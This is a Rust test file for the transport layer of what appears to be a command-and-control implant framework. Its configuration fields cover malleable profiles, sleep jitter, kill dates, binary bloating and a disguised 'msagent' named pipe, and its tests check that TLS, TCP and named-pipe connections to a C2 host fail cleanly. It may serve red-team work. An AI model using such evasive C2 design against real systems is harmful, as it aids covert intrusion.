// tests/test_transport.rs — Transport layer tests

use rcm::common::{C2Config, TransportProtocol, MalleableProfile, ProxyConfig, FallbackConfig};

fn make_config(host: &str, port: u16, transport: TransportProtocol) -> C2Config {
    C2Config {
        transport,
        profile: MalleableProfile::default(),
        proxy: ProxyConfig::default(),
        fallback: FallbackConfig::default(),
        server_public_key: String::new(),
        hash_salt: String::new(),
        c2_host: host.into(),
        build_id: "test".into(),
        tunnel_port: port,
        sleep_interval: 5,
        jitter_min: 0,
        jitter_max: 0,
        bloat_mb: 0,
        debug: false,
        kill_date: None,
    }
}

#[test]
fn test_client_transport_stores_sni_from_config() {
    let config = make_config("c2.example.com", 443, TransportProtocol::Tls);
    let transport = rcm::transport::ClientTransport::new(&config);
    // The transport should store the SNI from config, not hardcode "localhost".
    // We verify this indirectly by checking that connecting to a non-existent
    // host doesn't panic (it should return an error).
    let rt = tokio::runtime::Runtime::new().unwrap();
    let result = rt.block_on(transport.connect());
    assert!(result.is_err()); // Connection fails but doesn't panic
}

#[test]
fn test_client_transport_tcp_plain() {
    let config = make_config("127.0.0.1", 1, TransportProtocol::TcpPlain);
    let transport = rcm::transport::ClientTransport::new(&config);
    let rt = tokio::runtime::Runtime::new().unwrap();
    let result = rt.block_on(transport.connect());
    assert!(result.is_err()); // No server listening, but no panic
}

#[test]
fn test_client_transport_named_pipe_non_windows() {
    let config = make_config("127.0.0.1:testpipe", 0, TransportProtocol::NamedPipe);
    let transport = rcm::transport::ClientTransport::new(&config);
    let rt = tokio::runtime::Runtime::new().unwrap();
    let result = rt.block_on(transport.connect());
    // On non-Windows, should return an error, not panic
    if cfg!(not(target_os = "windows")) {
        assert!(result.is_err());
    }
}

#[test]
fn test_target_addr_format_tcp() {
    let config = make_config("10.0.0.1", 4443, TransportProtocol::Tls);
    let _transport = rcm::transport::ClientTransport::new(&config);
    // Should format as "10.0.0.1:4443" internally — no panic
}

#[test]
fn test_target_addr_format_named_pipe() {
    let config = make_config("192.168.1.1:msagent", 0, TransportProtocol::NamedPipe);
    let _transport = rcm::transport::ClientTransport::new(&config);
    // Should store "192.168.1.1:msagent" as-is — no panic
}
